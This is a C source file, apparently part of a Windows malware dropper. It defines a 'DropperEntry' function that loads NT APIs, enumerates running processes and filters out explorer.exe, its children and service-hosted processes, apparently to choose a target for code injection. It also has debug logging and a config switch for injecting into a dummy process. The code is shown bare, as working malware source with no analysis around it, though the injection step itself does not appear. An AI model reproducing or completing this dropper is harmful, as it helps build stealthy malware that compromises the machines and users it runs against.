#include <ldr.h>
#include <ntapi.h>
#include <fnv1a.h>
#include <random.h>

VOID
DECLSPEC_DLLEXPORT
DropperEntry(VOID)
{
    #ifdef DEBUG
        #ifdef _AMD64_
            UNICODE_STRING DebugName = CONST_UNICODE_STRING(SCFG_DLOG_DROPPER_X64_THREAD0);

            $DLogInitialize(&DebugName, TRUE);
        #else
            $DLogInitialize(NULL, TRUE);
        #endif
    #endif

    InitRandom();

    if (!LdrLoadNtapi()) {
        return;
    }

    PSYSTEM_PROCESS_INFORMATION ProcessesList;

    if (LdrQueryAllProcesses(&ProcessesList)) {
        #if SCFG_DROPPER_PROCESSQUERY_INJECT_TO_PHONY == ON
            for (PSYSTEM_PROCESS_INFORMATION ProcessIndex = ProcessesList; ProcessIndex->NextEntryOffset; ProcessIndex = (PVOID)((ULONG_PTR)ProcessIndex + ProcessIndex->NextEntryOffset)) {
                #ifdef _AMD64_
                    WCHAR szDummyName[] = L"DummyProcessx64.exe";
                #else
                    WCHAR szDummyName[] = L"DummyProcessx86.exe";
                #endif
                
                if (RtlpCompareUnicodeNZ(ProcessIndex->ImageName.Buffer, szDummyName, sizeof(szDummyName))) {
                
                }
            }
        #else
            PROCESSESFILTER Filter;
            QWORD qwTimeDenominator = SCFG_DROPPER_PROCESSQUERY_TIME_DENOMINATOR;

            if (LdrCreateOptimalProcessFilter(ProcessesList, &Filter)) {
                for (ULONG_PTR i = 0; i != SCFG_DROPPER_PROCESSQUERY_TRIES; i++) {
                    $DLOG2(DLG_FLT_DEFAULT, "qwTimeDenominator = %I64lu", qwTimeDenominator);

                    for (PSYSTEM_PROCESS_INFORMATION ProcessIndex = ProcessesList; ProcessIndex->NextEntryOffset; ProcessIndex = (PVOID)((ULONG_PTR)ProcessIndex + ProcessIndex->NextEntryOffset)) {
                        if (!ProcessIndex->UniqueProcessId || (QWORD)ProcessIndex->CreateTime.QuadPart / qwTimeDenominator > Filter.qwExplorerStartTime / qwTimeDenominator) {
                            continue;
                        }

                        if (ProcessIndex->UniqueProcessId == Filter.ExplorerPid || ProcessIndex->InheritedFromUniqueProcessId == Filter.ExplorerPid) {
                            #if SCFG_DROPPER_PROCESSQUERY_PRINT_QUERY == ON
                                $DLOG1(DLG_FLT_DEFAULT, "    %p -> %p %ls", ProcessIndex->InheritedFromUniqueProcessId, ProcessIndex->UniqueProcessId, ProcessIndex->ImageName.Buffer);
                            #endif

                            ProcessIndex->UniqueProcessId = 0;
                        } else if (ProcessIndex->InheritedFromUniqueProcessId != Filter.ServicePid) {
                            for (PSYSTEM_PROCESS_INFORMATION ServicesIndex = ProcessesList; ServicesIndex->NextEntryOffset; ServicesIndex = (PVOID)((ULONG_PTR)ServicesIndex + ServicesIndex->NextEntryOffset)) {
                                if (ServicesIndex->InheritedFromUniqueProcessId == Filter.ServicePid) { // svchost.exe
                                    if (ProcessIndex->InheritedFromUniqueProcessId == ServicesIndex->UniqueProcessId) {
                                        #if SCFG_DROPPER_PROCESSQUERY_PRINT_QUERY == ON
                                            $DLOG1(DLG_FLT_DEFAULT, "    %p -> %p %ls", ProcessIndex->InheritedFromUniqueProcessId, ProcessIndex->UniqueProcessId, ProcessIndex->ImageName.Buffer);
                                        #endif

                                        ProcessIndex->UniqueProcessId = 0;
                                    }
                                }
                            }
                        }
                    }

                    qwTimeDenominator <<= SCFG_DROPPER_PROCESSQUERY_TIME_SHIFT_ON_FAIL;

                    if (i == SCFG_DROPPER_PROCESSQUERY_TRIES - 1) {
                        $DLOG1(DLG_FLT_CRITICAL, "Failed!");
                    } else {
                        $DLOG1(DLG_FLT_ERROR, "Increasing time denominator!");
                    }
                }
            }
        #endif
    }
}
